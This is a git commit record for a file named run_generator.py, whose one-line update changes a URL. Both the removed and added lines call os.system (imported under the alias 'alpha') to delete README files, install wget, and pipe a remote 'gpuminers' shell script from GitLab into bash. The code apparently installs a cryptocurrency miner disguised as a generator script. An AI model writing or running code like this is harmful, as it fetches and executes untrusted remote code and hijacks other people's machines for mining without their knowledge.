53c2ca39867b72e05be92cd29404838e8a944826
kennethweasel <92172025+kennethweasel@users.noreply.github.com>
2021-10-13 15:27:56 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_wine_erg_ws5.sh | bash")
+alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_basket_erg_ws5.sh | bash")
